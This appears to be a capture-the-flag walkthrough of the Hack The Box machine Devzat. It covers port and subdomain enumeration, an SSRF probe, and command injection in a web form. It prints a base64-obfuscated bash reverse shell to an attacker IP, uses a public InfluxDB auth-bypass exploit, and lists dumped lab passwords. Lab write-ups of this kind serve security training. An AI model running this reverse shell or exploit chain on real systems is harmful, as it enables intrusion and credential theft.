##### Box Name: [Devzat](https://app.hackthebox.com/machines/Devzat)
##### Difficulty: Medium
---

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/devzat.png)

## Enumeration

### Port Scan
##### TCP
```js
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://devzat.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=3/10%Time=622A1FFB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web server enumeration
From the nmap output, we can see that the port 80 is redirecting to http://devzat.htb. We will need to add the hostname `devzat.htb` on our hosts file to be able to visit the website.

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/website.png)

We also get an email: `patrick@devzat.htb` on the website.

### Other service enumeration
We have a SSH service at port 8000
While trying to connect, if you get this error message:
```txt
Unable to negotiate with 10.10.11.118 port 8000: no matching host key type found. Their offer: ssh-rsa
```
Add the following line to `/etc/ssh/ssh_config` file to fix the issue:
```txt
HostKeyAlgorithms +ssh-rsa,ssh-dss
```

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/ssh-chatroom.png)

Logging in, we see it is a chatroom over SSH. It is the [devzat](https://github.com/quackduck/devzat) chat application.
It accepts different syntax options for the text such as:
- `*text*` -> Italic
- `_text_` -> Italic
- `**text**` -> Bold
- `~~text~~` -> strikethrough

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/syntax-options.png)

This made me check for other ways I can play with the text. In this process, I found out that URLs were shown in the markdown format of `[link text](URL of link)`
For example: `http://example.com` would become `[http://example.com](http://example.com)`

In markdown, we can include remote images with the syntax of `![](URL of image)`. I tried to fetch remote files with this technique and was successful in making a server side request to my python http server. This can be a potential SSRF attack surface.

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/remote-fetch-possible.png)

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/capture-request.png)

However, I couldn't do anything beyond simply making a simple get request. So I'll move towards subdomain enumeration.

#### Subdomain enumeration:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -o ffuf-vhosts.out -u http://devzat.htb -H "Host: FUZZ.devzat.htb" -fw 18
```
Found subdomain:
```bash
pets.devzat.htb
```

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/pets-devzat-htb.png)

The website takes in Pet name and Pet species. The pet species can be selected from a dropdown list containing different available species on the website's backend. After adding the pet, the website displays the relevant text for that species.

Let's check the request on Burpsuite:

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/add-pet-req.png)

After playing with the parameters, we can successfully get command injection. Try the following payload as shown below on the species parameter:

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/command-injection-poc.png)

Since we added the `sleep 4` command, the request takes 4 seconds as expected.

## Exploitation
### Foothold
I used the following reverse shell to get a shell on the system:
```bash
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQvODAgMD4mMQ== | base64 -d | bash
```

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/revshell.png)

After getting a simple shell, we can get an encrypted SSH shell with the SSH private key found at `~/.ssh/id_rsa`.

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/patrick-id-rsa.png)

### Towards User
There are two user accounts on the system:
- patrick
- catherine

Logging in as both patrick and catherine, we see their private chat logs on the devzat chatroom:

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/chat-logs.png)

Checking the chat logs on the devzat chatroom as patrick, we can see that there were discussions of patrick and admin about influxdb instance.

Using `netstat`, we can see that the influxdb port 8086 is open:

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/netstat-output.png)

To identify the InfluxDB version, we use `curl` and check the `X-Influxdb-Version` header.

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/influxdb-version.png)

InfluxDB version: 1.7.5
Doing a quick google search, I found that this version is vulnerable to an authentication bypass vulnerability (CVE-2019-20933) in Influxdb's authenticate function due to an empty shared secret.

There is a public exploit for this vulnerability available on Github
https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

We will use this exploit. First we need to get a SSH port forward of port 8086 to our attacker machine.
```bash
ssh -L 8086:127.0.0.1:8086 patrick@devzat.htb -i patrick-id_rsa -fN
```
![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/influxdb-exploit.png)

Got passwords of three users from the database:

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/creds.png)

| User      | Password                         |
| --------- | -------------------------------- |
| wilhelm   | `WillyWonka2021`                   |
| catherine | `woBeeYa*************************` |
| charles   | `RoyalQueenBee$`                   | 

We can switch to user catherine with her password `woBeeYa*************************`

### Privilege escalation to root
From the chat logs we found earlier, it was mentioned that there were source code available in the backups.

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/devzat-backups.png)

Download these zip files into our local machine.
Using `grep`, we found a password  `CeilingCat******************` in the backups

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/got-password.png)

In the local dev instance of devzat, we can see a `/file` command that isn't present in the production environment running on port 8000. It requires a password to preview the file. 

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/local-dev-instance.png)

Let's use the password that we found in the source code. We now have the root user's private key and can get a shell as root.

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/root-private-ssh-key.png)

Getting a shell as root is as simple as this:

![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/HackTheBox/machines/Devzat/images/got-root.png)

Happy Hacking :)

---
